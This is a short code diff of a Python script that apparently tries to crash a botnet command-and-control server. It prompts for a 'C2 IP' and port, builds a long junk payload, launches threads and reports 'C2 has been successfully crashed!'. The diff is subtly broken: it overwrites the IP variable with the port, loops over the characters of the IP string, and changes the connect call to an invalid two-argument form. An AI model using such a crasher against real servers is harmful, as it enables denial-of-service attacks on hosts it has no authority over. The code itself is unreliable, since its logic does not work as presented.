@@ -25,7 +25,9 @@ os.system("clear")
 print(intro)
 
 c2ip = input(("C2 IP: "))
+c2ip = str(c2ip)
 c2port = input(("C2 Port: "))
+c2ip = str(c2port)
 payload = "void"+"d"*9999
 timeout = 3
 somesock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -41,7 +43,7 @@ for crasher in c2ip:
 	crasher.replace("/", "")
 	crasher2 = Thread(target=crash, args=(c2ip,))
 	crasher2.start()
-	result = somesock.connect_ex((c2ip,c2port))
+	result = somesock.connect_ex(c2ip,c2port)
 	if result == 0:
 		print(Fore.GREEN+"C2 has been successfully crashed!")
 	else:
